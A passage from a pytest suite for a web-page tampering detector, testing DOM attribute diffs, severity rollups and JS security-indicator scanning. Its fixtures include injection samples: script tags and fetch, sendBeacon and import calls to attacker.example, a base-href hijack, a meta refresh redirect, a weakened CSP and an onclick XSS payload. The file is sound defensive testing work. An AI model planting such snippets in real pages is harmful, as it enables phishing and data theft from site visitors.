    b = _write_html(tmp_path / "b.html", '<html lang="fr"><body>x</body></html>')
    result = dom.compare_dom(a, b)
    lang_changes = [
        c for c in result["key_attributes"]["changes"] if c["key"] == "html[0].lang"
    ]
    assert len(lang_changes) == 1
    assert lang_changes[0]["impact"] == "medium"


def test_compare_dom_html_class_change_caught(tmp_path):
    """`html.class` is sometimes used for theme-class on the root
    element (e.g. `<html class="dark">`). Caught via wildcard tracking
    + the html-specific impact override sets it to medium."""
    a = _write_html(tmp_path / "a.html", '<html class="light"><body>x</body></html>')
    b = _write_html(tmp_path / "b.html", '<html class="dark"><body>x</body></html>')
    result = dom.compare_dom(a, b)
    cls = next(
        (c for c in result["key_attributes"]["changes"] if c["key"] == "html[0].class"),
        None,
    )
    assert cls is not None
    assert cls["impact"] == "medium"


def test_compare_dom_no_changes_for_identical_with_wildcard_attrs(tmp_path):
    """Identical body/html with multiple wildcard-tracked attrs must
    produce zero changes - the wildcard walker shouldn't false-positive."""
    html = (
        '<html lang="en" dir="ltr">'
        '<body class="x y" data-theme="dark" data-foo="bar">x</body>'
        "</html>"
    )
    a = _write_html(tmp_path / "a.html", html)
    b = _write_html(tmp_path / "b.html", html)
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is False
    assert result["key_attributes"]["changes"] == []


# ---------------------------------------------------------------------------
# DOM differ - difflib alignment for attribute lists (Bug #3)
# ---------------------------------------------------------------------------


def test_compare_key_attributes_insertion_does_not_shift_others(tmp_path):
    """Inserting a new <script src=injected> at position 0 must emit
    EXACTLY ONE attribute_added record. Pre-fix the positional matcher
    saw `script[0].src changed`, `script[1].src changed`, `script[2].src
    changed`, `script[3].src added` - 3 spurious changes for 1 real one
    (the audit showed `attrs=8` on the script_injection site)."""
    a = _write_html(
        tmp_path / "a.html",
        (
            "<html><head>"
            '<script src="a.js"></script>'
            '<script src="b.js"></script>'
            '<script src="c.js"></script>'
            "</head><body>x</body></html>"
        ),
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><head>"
            '<script src="https://attacker.example/x.js"></script>'
            '<script src="a.js"></script>'
            '<script src="b.js"></script>'
            '<script src="c.js"></script>'
            "</head><body>x</body></html>"
        ),
    )

    result = dom.compare_dom(a, b)
    script_attr_changes = [
        c for c in result["key_attributes"]["changes"] if "script" in c["key"]
    ]
    assert len(script_attr_changes) == 1, (
        f"Expected exactly 1 change (the injection); got "
        f"{len(script_attr_changes)}: {script_attr_changes}"
    )
    assert script_attr_changes[0]["type"] == "attribute_added"
    assert "attacker.example" in script_attr_changes[0]["new_value"]


def test_compare_key_attributes_deletion_does_not_shift_others(tmp_path):
    """Removing a script at position 1 should emit exactly one
    attribute_removed, not N-1 spurious changes for the shifted scripts."""
    a = _write_html(
        tmp_path / "a.html",
        (
            "<html><head>"
            '<script src="a.js"></script>'
            '<script src="legacy.js"></script>'
            '<script src="b.js"></script>'
            "</head><body>x</body></html>"
        ),
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><head>"
            '<script src="a.js"></script>'
            '<script src="b.js"></script>'
            "</head><body>x</body></html>"
        ),
    )

    result = dom.compare_dom(a, b)
    removed = [
        c
        for c in result["key_attributes"]["changes"]
        if c["type"] == "attribute_removed" and "script" in c["key"]
    ]
    others = [
        c
        for c in result["key_attributes"]["changes"]
        if c["type"] != "attribute_removed" and "script" in c["key"]
    ]
    assert len(removed) == 1
    assert "legacy.js" in removed[0]["old_value"]
    assert others == [], (
        f"Deletion at position 1 should NOT trigger any non-removed "
        f"records on the same tag; got: {others}"
    )


def test_compare_key_attributes_real_change_in_middle_unaffected_by_neighbors(
    tmp_path,
):
    """A genuine attribute mutation on script[1] should report exactly
    that as `attribute_changed` - not as add+remove from the alignment.
    Verifies the matcher prefers replace over delete+insert when
    neighbors match."""
    a = _write_html(
        tmp_path / "a.html",
        (
            "<html><head>"
            '<script src="a.js"></script>'
            '<script src="legit.js"></script>'
            '<script src="c.js"></script>'
            "</head><body>x</body></html>"
        ),
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><head>"
            '<script src="a.js"></script>'
            '<script src="https://attacker.example/swap.js"></script>'
            '<script src="c.js"></script>'
            "</head><body>x</body></html>"
        ),
    )

    result = dom.compare_dom(a, b)
    script_changes = [
        c for c in result["key_attributes"]["changes"] if "script" in c["key"]
    ]
    assert len(script_changes) == 1
    assert script_changes[0]["type"] == "attribute_changed"
    assert script_changes[0]["old_value"] == "legit.js"
    assert "attacker.example" in script_changes[0]["new_value"]


def test_compare_key_attributes_aligns_link_href_list_with_added_canonical(
    tmp_path,
):
    """Inserting a new <link rel=canonical href=...> shouldn't shift all
    existing <link href=...> entries into spurious 'changed' rows. Same
    bug class as the script case but a different tag - confirms the fix
    is per (tag, attr) pair, not script-specific."""
    a = _write_html(
        tmp_path / "a.html",
        (
            "<html><head>"
            '<link rel="stylesheet" href="a.css">'
            '<link rel="stylesheet" href="b.css">'
            "</head><body>x</body></html>"
        ),
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><head>"
            '<link rel="canonical" href="https://attacker.example/canonical">'
            '<link rel="stylesheet" href="a.css">'
            '<link rel="stylesheet" href="b.css">'
            "</head><body>x</body></html>"
        ),
    )

    result = dom.compare_dom(a, b)
    href_added = [
        c
        for c in result["key_attributes"]["changes"]
        if c["type"] == "attribute_added"
        and c["key"].startswith("link[")
        and "href" in c["key"]
    ]
    href_changed = [
        c
        for c in result["key_attributes"]["changes"]
        if c["type"] == "attribute_changed"
        and c["key"].startswith("link[")
        and "href" in c["key"]
    ]
    assert len(href_added) == 1
    assert "attacker.example" in href_added[0]["new_value"]
    assert href_changed == [], (
        f"Insertion shouldn't shift existing <link href> values into "
        f"'changed' rows; got: {href_changed}"
    )


def test_compare_key_attributes_ignores_duplicate_href_reordering(tmp_path):
    """Duplicate link values can move positions without changing behavior.

    This reproduces the site-20 control false positive from audit
    01KT52N1DC9CGZ61BJF7Q89RDN: the same href appeared as removed from
    one anchor index and added to another even though the href multiset
    was unchanged and the screenshot/content were identical.
    """
    a = _write_html(
        tmp_path / "a.html",
        (
            "<html><body>"
            '<a href="/x">one</a>'
            '<a>plain</a>'
            '<a href="/x">two</a>'
            "</body></html>"
        ),
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><body>"
            '<a href="/x">one</a>'
            '<a href="/x">plain</a>'
            '<a>two</a>'
            "</body></html>"
        ),
    )

    result = dom.compare_dom(a, b)

    assert result["key_attributes"]["changes"] == []


# ---------------------------------------------------------------------------
# change_summary aggregator (Bugs #4 + #5 from audit 01KQX5SV...)
# ---------------------------------------------------------------------------

from test_ui.comparator import summary as summary_mod  # noqa: E402


def _empty_screenshot():
    return {"visual_changes": False, "ssim_score": 1.0}


def _empty_assets():
    return {"has_changes": False}


def _dom_no_changes():
    return {
        "has_changes": False,
        "title": {"changed": False},
        "structure": {"element_changes": []},
        "content": {"significant_change": False},
        "meta": {"changes": []},
        "key_attributes": {"changes": []},
        "headings": {"changes": []},
    }


def test_change_summary_href_hijack_escalates_to_high_severity():
    """The headline bug from audit 01KQX5SV...: an `<a href>` value swap
    rated impact=high by the attribute walker was being flattened to
    `change_severity=low` and `recommendation="No changes detected"`
    by the aggregator. Now the per-detector impact must propagate to
    the rollup."""
    dom = _dom_no_changes()
    dom["has_changes"] = True
    dom["key_attributes"]["changes"] = [
        {
            "type": "attribute_changed",
            "key": "a[0].href",
            "old_value": "https://gov.ie/",
            "new_value": "https://attacker.example/",
            "impact": "high",
        }
    ]
    result = summary_mod.create_change_summary_json(
        _empty_screenshot(), dom, _empty_assets(), _empty_assets(), _empty_assets()
    )
    assert result["overall_assessment"]["change_severity"] == "high"
    assert result["overall_assessment"]["user_impact"] == "high"
    assert result["ai_analysis_priority"] == "high"
    assert "links_and_navigation" in result["affected_components"]
    # Recommendation must NOT be the misleading default.
    assert result["recommendation"] != "No changes detected"
    assert (
        "phishing" in result["recommendation"].lower()
        or "audit" in result["recommendation"].lower()
    )


def test_change_summary_no_changes_keeps_default_recommendation():
    """The default-text path is reserved for genuinely empty results;
    a tiny html change should NOT trigger the 'No changes detected'
    string."""
    result = summary_mod.create_change_summary_json(
        _empty_screenshot(),
        _dom_no_changes(),
        _empty_assets(),
        _empty_assets(),
        _empty_assets(),
    )
    assert result["overall_assessment"]["change_severity"] == "none"
    assert result["recommendation"] == "No changes detected"


def test_change_summary_media_only_change_requires_review():
    """Media-only diffs should not collapse to severity=none.

    Regression guard: pre-fix media changes toggled `changes_detected=True`
    but never contributed to severity/impact/recommendations, so the summary
    reported `requires_review=False`.
    """
    media = {"has_changes": True}
    result = summary_mod.create_change_summary_json(
        _empty_screenshot(),
        _dom_no_changes(),
        _empty_assets(),
        _empty_assets(),
        media,
    )
    assert result["overall_assessment"]["changes_detected"] is True
    assert result["overall_assessment"]["change_severity"] == "medium"
    assert result["overall_assessment"]["requires_review"] is True
    assert "media" in result["affected_components"]
    assert result["recommendation"] != "No changes detected"


def test_change_summary_html_only_change_emits_html_recommendation():
    """Pre-fix any HTML-only change yielded `recommendation="No changes
    detected"` because the recommendations list only had visual/css/js
    branches. Now html mutations must produce SOMETHING actionable."""
    dom = _dom_no_changes()
    dom["has_changes"] = True
    dom["title"] = {"changed": True, "baseline": "old", "current": "new"}
    result = summary_mod.create_change_summary_json(
        _empty_screenshot(), dom, _empty_assets(), _empty_assets(), _empty_assets()
    )
    assert result["recommendation"] != "No changes detected"
    assert "title" in result["recommendation"].lower()


def test_change_summary_heading_change_in_affected_components():
    """Heading text change should be bucketed as 'headings' rather than
    the catch-all 'content + structure' bucket."""
    dom = _dom_no_changes()
    dom["has_changes"] = True
    dom["headings"]["changes"] = [
        {
            "type": "heading_text_changed",
            "key": "h1[0]",
            "old_text": "Welcome",
            "new_text": "[CRITICAL] Welcome",
            "impact": "medium",
        }
    ]
    result = summary_mod.create_change_summary_json(
        _empty_screenshot(), dom, _empty_assets(), _empty_assets(), _empty_assets()
    )
    assert "headings" in result["affected_components"]
    # Heading impact medium → severity medium.
    assert result["overall_assessment"]["change_severity"] == "medium"


def test_change_summary_script_src_injection_buckets_as_scripts():
    """Phishing/supply-chain class: a new <script src=attacker> should
    bucket the result as 'scripts', not opaque 'content/structure'."""
    dom = _dom_no_changes()
    dom["has_changes"] = True
    dom["key_attributes"]["changes"] = [
        {
            "type": "attribute_added",
            "key": "script[1].src",
            "new_value": "https://attacker.example/track.js",
            "impact": "high",
        }
    ]
    result = summary_mod.create_change_summary_json(
        _empty_screenshot(), dom, _empty_assets(), _empty_assets(), _empty_assets()
    )
    assert "scripts" in result["affected_components"]
    assert result["overall_assessment"]["change_severity"] == "high"


def test_change_summary_exposes_attribute_and_heading_counts_to_ai():
    """The change_categories.content section now surfaces attribute /
    heading / meta change counts so the AI prompt's category check
    sees that they occurred (pre-fix only title/text/structure were
    in the content section, hiding attribute mutations)."""
    dom = _dom_no_changes()
    dom["has_changes"] = True
    dom["key_attributes"]["changes"] = [
        {
            "type": "attribute_changed",
            "key": "html[0].lang",
            "old_value": "en",
            "new_value": "fr",
            "impact": "medium",
        }
    ]
    dom["headings"]["changes"] = [
        {
            "type": "heading_text_changed",
            "key": "h1[0]",
            "old_text": "x",
            "new_text": "y",
            "impact": "medium",
        }
    ]
    dom["meta"]["changes"] = [{"type": "meta_added", "key": "robots", "impact": "low"}]
    result = summary_mod.create_change_summary_json(
        _empty_screenshot(), dom, _empty_assets(), _empty_assets(), _empty_assets()
    )
    content = result["change_categories"]["content"]
    assert content["attribute_changes"] == 1
    assert content["heading_changes"] == 1
    assert content["meta_changes"] == 1


def test_max_severity_helper():
    """High wins over medium wins over low wins over none. Empty list
    returns 'none'."""
    assert summary_mod._max_severity([]) == "none"
    assert summary_mod._max_severity(["low"]) == "low"
    assert summary_mod._max_severity(["low", "medium"]) == "medium"
    assert summary_mod._max_severity(["medium", "high", "low"]) == "high"
    assert summary_mod._max_severity(["none", "none"]) == "none"


# ---------------------------------------------------------------------------
# DOM differ - post-audit-01KR1BZE73 fixes:
#   - extended TAG_TYPES (meta/style/base/iframe/...)
#   - http-equiv tracking in extract_meta_info
#   - base.href in KEY_ATTRIBUTES
#   - dynamic_attributes walker for on* / style / aria-*
# ---------------------------------------------------------------------------


def test_compare_dom_detects_meta_tag_addition_via_tag_count(tmp_path):
    """Pre-fix `<meta>` wasn't in TAG_TYPES so adding/removing meta
    elements was silently invisible. Now structural element-count
    catches the add."""
    a = _write_html(
        tmp_path / "a.html",
        '<html><head><meta charset="utf-8"></head><body>x</body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><head>"
            '<meta charset="utf-8">'
            '<meta http-equiv="refresh" content="0;url=https://attacker.example">'
            "</head><body>x</body></html>"
        ),
    )
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    meta_changes = [
        c for c in result["structure"]["element_changes"] if c["element"] == "meta"
    ]
    assert len(meta_changes) == 1
    assert meta_changes[0]["change_type"] == "added"
    assert meta_changes[0]["count_change"] == 1


def test_compare_dom_detects_csp_meta_value_change_via_http_equiv(tmp_path):
    """`<meta http-equiv="Content-Security-Policy" content="...">` value
    changes were silently invisible pre-fix because extract_meta_info
    only walked name= and property=, not http-equiv. Now CSP value
    mutations show up in meta.changes."""
    a = _write_html(
        tmp_path / "a.html",
        (
            "<html><head>"
            '<meta http-equiv="Content-Security-Policy" '
            "content=\"default-src 'self'\">"
            "</head><body>x</body></html>"
        ),
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><head>"
            '<meta http-equiv="Content-Security-Policy" '
            "content=\"default-src * 'unsafe-inline' 'unsafe-eval'\">"
            "</head><body>x</body></html>"
        ),
    )
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    csp_changes = [
        c
        for c in result["meta"]["changes"]
        if "http-equiv:Content-Security-Policy" in c.get("key", "")
    ]
    assert len(csp_changes) >= 1


def test_compare_dom_detects_base_href_change(tmp_path):
    """`<base href="...">` value swap rewrites every relative URL on
    the page - catastrophic if hijacked. Caught via base.href in
    KEY_ATTRIBUTES."""
    a = _write_html(
        tmp_path / "a.html",
        '<html><head><base href="https://gov.ie/"></head><body>x</body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        '<html><head><base href="https://attacker.example/"></head><body>x</body></html>',
    )
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    base_changes = [
        c for c in result["key_attributes"]["changes"] if c["key"] == "base[0].href"
    ]
    assert len(base_changes) == 1
    assert base_changes[0]["impact"] == "high"


def test_compare_dom_detects_onclick_injection(tmp_path):
    """Inline event handler injection - XSS-class. Pre-fix `on*` attrs
    weren't tracked anywhere; now the dynamic_attributes walker emits
    the change with impact=high."""
    a = _write_html(
        tmp_path / "a.html",
        '<html><body><a href="/x">link</a></body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        (
            "<html><body>"
            '<a href="/x" onclick="alert(\'AFR-XSS\')">link</a>'
            "</body></html>"
        ),
    )
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    onclick = next(
        (
            c
            for c in result["dynamic_attributes"]["changes"]
            if c.get("key") == "a[0].onclick"
        ),
        None,
    )
    assert onclick is not None
    assert onclick["type"] == "attribute_added"
    assert onclick["impact"] == "high"


def test_compare_dom_detects_inline_style_injection(tmp_path):
    """Inline style="..." injection bypasses the CSS file diff.
    Pre-fix invisible; now caught with impact=medium."""
    a = _write_html(
        tmp_path / "a.html",
        "<html><body><h1>Welcome</h1></body></html>",
    )
    b = _write_html(
        tmp_path / "b.html",
        '<html><body><h1 style="background:red;color:white">Welcome</h1></body></html>',
    )
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    style = next(
        (
            c
            for c in result["dynamic_attributes"]["changes"]
            if c.get("key") == "h1[0].style"
        ),
        None,
    )
    assert style is not None
    assert style["type"] == "attribute_added"
    assert style["impact"] == "medium"


def test_compare_dom_detects_aria_label_strip(tmp_path):
    """Stripping aria-label from a button: a11y regression. Pre-fix
    invisible (aria-* not tracked); now caught with impact=medium."""
    a = _write_html(
        tmp_path / "a.html",
        '<html><body><button aria-label="Close dialog">X</button></body></html>',
    )
    b = _write_html(
        tmp_path / "b.html",
        "<html><body><button>X</button></body></html>",
    )
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is True
    aria = next(
        (
            c
            for c in result["dynamic_attributes"]["changes"]
            if c.get("key") == "button[0].aria-label"
        ),
        None,
    )
    assert aria is not None
    assert aria["type"] == "attribute_removed"
    assert aria["impact"] == "medium"


def test_compare_dom_no_dynamic_attribute_changes_for_identical(tmp_path):
    """Identical pages with on*/style/aria-* attrs must NOT generate
    spurious dynamic_attribute records - guards against the walker
    over-reporting on unchanged input."""
    html = (
        "<html><body>"
        '<button aria-label="x" onclick="f()" style="color:red">X</button>'
        "</body></html>"
    )
    a = _write_html(tmp_path / "a.html", html)
    b = _write_html(tmp_path / "b.html", html)
    result = dom.compare_dom(a, b)
    assert result["has_changes"] is False
    assert result["dynamic_attributes"]["changes"] == []


# ---------------------------------------------------------------------------
# Report severity floor (security-indicator post-processing)
# ---------------------------------------------------------------------------


def test_minimum_severity_floors_for_attacker_domain():
    """Any diff containing attacker.example must floor at CRITICAL."""
    from test_ui.report.generator import _minimum_severity_from_structured_data

    sd = {
        "html_changes": {
            "changes": [
                {
                    "type": "structure_detail",
                    "code_snippet": '<script src="https://attacker.example/x.js">',
                }
            ]
        }
    }
    assert _minimum_severity_from_structured_data(sd) == "CRITICAL"


def test_minimum_severity_floors_for_csp_weakening():
    """CSP meta-tag changes must floor at WARNING."""
    from test_ui.report.generator import _minimum_severity_from_structured_data

    sd = {
        "html_changes": {
            "changes": [
                {
                    "type": "attributes",
                    "element": "meta[http-equiv:Content-Security-Policy]",
                }
            ]
        }
    }
    assert _minimum_severity_from_structured_data(sd) == "WARNING"


def test_minimum_severity_safe_for_benign_changes():
    """Purely cosmetic diffs with no security indicators stay at SAFE."""
    from test_ui.report.generator import _minimum_severity_from_structured_data

    sd = {
        "html_changes": {
            "changes": [
                {"type": "content", "description": "Heading text changed"}
            ]
        },
        "css_changes": {"changes": [{"description": "Color changed to #f00"}]},
    }
    assert _minimum_severity_from_structured_data(sd) == "SAFE"


# ---------------------------------------------------------------------------
# CSS / JS changes JSON surfacing content_changes (post-audit-01KRC46...)
# ---------------------------------------------------------------------------


def test_create_css_changes_json_surfaces_security_relevant_content_changes():
    """Per-rule CSS diffs with attacker domains must be visible to the AI."""
    css_result = {
        "has_changes": True,
        "added": [],
        "removed": [],
        "changed": ["screen.css"],
        "content_changes": [
            {
                "type": "css_selector_added",
                "file": "screen.css",
                "selector": "body::before",
                "impact": "high",
                "properties": {"content": "'PHISH-VIA-PSEUDO'"},
            },
            {
                "type": "css_selector_added",
                "file": "screen.css",
                "selector": ".btn",
                "impact": "low",
                "properties": {"color": "#f00"},
            },
        ],
    }
    result = assets.create_css_changes_json(css_result)
    selectors = [c.get("selector", "") for c in result["changes"]]
    assert "body::before" in selectors
    assert ".btn" not in selectors  # low-impact, non-security


def test_create_css_changes_json_files_changed_includes_removed():
    """`files_changed` should enumerate removed files too."""
    css_result = {
        "has_changes": True,
        "added": ["new.css"],
        "removed": ["old.css"],
        "changed": ["main.css"],
        "content_changes": [],
    }
    result = assets.create_css_changes_json(css_result)
    assert result["files_changed"] == ["new.css", "main.css", "old.css"]


def test_create_js_changes_json_filters_noise_and_surfaces_security():
    """Minified boundary-drift noise is filtered; security vectors surface."""
    js_result = {
        "has_changes": True,
        "added": [],
        "removed": [],
        "changed": ["matomo.js"],
        "content_changes": [
            {
                "type": "js_function_added",
                "file": "matomo.js",
                "function_name": "__afrTamperMarker",
                "impact": "high",
                "code_snippet": 'function __afrTamperMarker() { return "test"; }',
            },
            {
                "type": "js_function_modified",
                "file": "matomo.js",
                "function_name": "N",
                "impact": "high",
                "code_snippet": "function N() {var au=typeof console;}",
            },
            {
                "type": "js_function_modified",
                "file": "matomo.js",
                "function_name": "N",  # duplicate name → noise
                "impact": "high",
                "code_snippet": "function N() {var av=typeof console;}",
            },
        ],
    }
    result = assets.create_js_changes_json(js_result)
    names = [c.get("function_name", "") for c in result["changes"]]
    assert "__afrTamperMarker" in names
    # Duplicate "N" should be deduplicated.
    assert names.count("N") == 1


def test_create_js_changes_json_surfaces_attacker_domain_in_snippet():
    """A JS function containing attacker.example must surface even if impact=low."""
    js_result = {
        "has_changes": True,
        "added": [],
        "removed": [],
        "changed": ["app.js"],
        "content_changes": [
            {
                "type": "js_function_added",
                "file": "app.js",
                "function_name": "exfil",
                "impact": "low",
                "code_snippet": "fetch('https://attacker.example/steal')",
            }
        ],
    }
    result = assets.create_js_changes_json(js_result)
    names = [c.get("function_name", "") for c in result["changes"]]
    assert "exfil" in names


def test_create_js_changes_json_files_changed_includes_removed():
    """`files_changed` should enumerate removed JS files too."""
    js_result = {
        "has_changes": True,
        "added": ["new.js"],
        "removed": ["legacy.js"],
        "changed": ["app.js"],
        "content_changes": [],
        "detailed_analysis": {},
    }
    result = assets.create_js_changes_json(js_result)
    assert result["files_changed"] == ["new.js", "app.js", "legacy.js"]


# ---------------------------------------------------------------------------
# Report generator timeout fallback
# ---------------------------------------------------------------------------


def test_timeout_fallback_synthesizes_severity_from_structured_data():
    """When AI returns a timeout error, the generator must synthesize a
    severity based on the structured diff data rather than persisting a
    raw error envelope."""
    from test_ui.report.generator import _synthesize_timeout_response

    sd = {
        "html_changes": {
            "changes": [
                {
                    "type": "structure_detail",
                    "code_snippet": '<script src="https://attacker.example/x.js">',
                }
            ]
        }
    }
    response = _synthesize_timeout_response(
        request_id="req-123", structured_data=sd
    )
    assert response["result_type"] == "analysis_success"
    assert response["overall_severity"] == "CRITICAL"
    assert response["business_impact"] == "HIGH"
    assert response["model"] == "synthetic_timeout_fallback"


# ---------------------------------------------------------------------------
# JS security indicator scanning (post-audit-01KRC46BJQFBSQ4Z6Y2R1EYEVZ)
# ---------------------------------------------------------------------------


def test_scan_js_security_indicators_catches_eval():
    """Appended eval() must be caught even when outside any function."""
    code = 'console.log("ok"); eval("document.cookie=\"pwned\"");'
    found = assets._scan_js_security_indicators(code)
    assert any("eval(" in f for f in found)


def test_scan_js_security_indicators_catches_document_write():
    """Appended document.write() must surface."""
    code = 'document.write("<script src=//attacker.example></script>");'
    found = assets._scan_js_security_indicators(code)
    assert any("document.write" in f for f in found)


def test_scan_js_security_indicators_catches_sendbeacon():
    """navigator.sendBeacon() exfiltration must surface."""
    code = 'navigator.sendBeacon("https://attacker.example/log", data);'
    found = assets._scan_js_security_indicators(code)
    assert any("sendBeacon" in f for f in found)


def test_scan_js_security_indicators_catches_dynamic_import():
    """Dynamic import() of attacker domain must surface."""
    code = 'import("https://attacker.example/malware.js");'
    found = assets._scan_js_security_indicators(code)
    assert any("import(" in f for f in found)


def test_scan_js_security_indicators_caps_snippet_length():
    """Snippets must be capped at 200 chars to avoid prompt bloat."""
    long = "x" * 500
    code = f'eval("{long}");'
    found = assets._scan_js_security_indicators(code)
    assert len(found) == 1
    assert len(found[0]) <= 200
    assert found[0].endswith("...")


def test_analyze_js_content_changes_surfaces_security_indicators(tmp_path):
    """Changed JS should include raw security indicators in analysis output."""
    baseline = tmp_path / "baseline.js"
    current = tmp_path / "current.js"
    baseline.write_text("function ok() { return 1; }\n")
    current.write_text('function ok() { return 1; }\n eval("alert(1)");\n')

    result = assets.analyze_js_content_changes(baseline, current, "app.js")

    assert result["has_changes"] is True
    assert "error" not in result["analysis"]
    added = result["analysis"]["security_indicators_added"]
    assert any("eval(" in snippet for snippet in added)


def test_create_js_changes_json_surfaces_security_indicators():
    """Security indicators from detailed_analysis must appear in the AI-facing
    changes list as security_indicator_added/removed records."""
    js_result = {
        "has_changes": True,
        "added": [],
        "removed": [],
        "changed": ["app.js"],
        "content_changes": [],
        "detailed_analysis": {
            "app.js": {
                "security_indicators_added": [
                    'eval("document.cookie=\\"pwned\\"");'
                ],
                "security_indicators_removed": [],
            }
        },
    }
    out = assets.create_js_changes_json(js_result)
    indicator_changes = [
        c for c in out["changes"] if c["change_type"] == "security_indicator_added"
    ]
    assert len(indicator_changes) == 1
    assert indicator_changes[0]["file"] == "app.js"
    assert "eval" in indicator_changes[0]["code_snippet"]
    assert indicator_changes[0]["impact"] == "high"


def test_create_js_changes_json_deduplicates_by_function_name():
    """Minified boundary drift often emits the same function name many times.
    The surfaced changes should only contain one entry per unique name."""
    js_result = {
        "has_changes": True,
        "added": [],
        "removed": [],
        "changed": ["bundle.js"],
        "content_changes": [
            {
                "type": "js_function_modified",
                "file": "bundle.js",
                "function_name": "a",
                "impact": "high",
                "code_snippet": "function a() { ... }",
            },
            {
                "type": "js_function_modified",
                "file": "bundle.js",
                "function_name": "a",
                "impact": "high",
                "code_snippet": "function a() { ... }",
            },
            {
                "type": "js_function_modified",
                "file": "bundle.js",
                "function_name": "b",
                "impact": "high",
                "code_snippet": "function b() { ... }",
            },
        ],
    }
    out = assets.create_js_changes_json(js_result)
    fn_changes = [
        c for c in out["changes"] if c["change_type"] == "function_modified"
    ]
    assert len(fn_changes) == 2
    names = {c["function_name"] for c in fn_changes}
    assert names == {"a", "b"}
